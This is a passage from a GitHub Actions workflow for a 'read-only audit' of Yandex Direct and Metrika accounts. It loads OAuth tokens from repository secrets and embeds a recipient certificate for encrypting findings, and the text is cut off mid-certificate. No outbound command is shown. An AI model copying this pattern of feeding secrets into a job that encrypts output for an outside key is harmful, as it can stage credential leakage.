name: Yandex stack read-only audit
on:
  push:
    branches: [ops/yandex-audit-20260921]
    paths: ['.github/workflows/yandex-stack-audit.yml']
permissions:
  contents: read
jobs:
  audit:
    runs-on: ubuntu-latest
    timeout-minutes: 12
    steps:
      - name: Read accounts and encrypt findings
        env:
          DIRECT_TOKEN: ${{ secrets.YANDEX_DIRECT_OAUTH_TOKEN }}
          METRIKA_TOKEN: ${{ secrets.YANDEX_METRIKA_OAUTH_TOKEN }}
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p /tmp/yandex-audit
          trap 'rm -f /tmp/yandex-audit/report.json' EXIT
          cat > /tmp/yandex-audit/recipient.pem <<'CERT'
          -----BEGIN CERTIFICATE-----
          MIIEOzCCAqOgAwIBAgIUGw6hL4MdYM8u4rVBtw6pLmjNDnowDQYJKoZIhvcNAQEL
          BQAwLTErMCkGA1UEAwwiU3RlZWxQcm9kdWt0IFlhbmRleCBBdWRpdCAyMDI2MDky
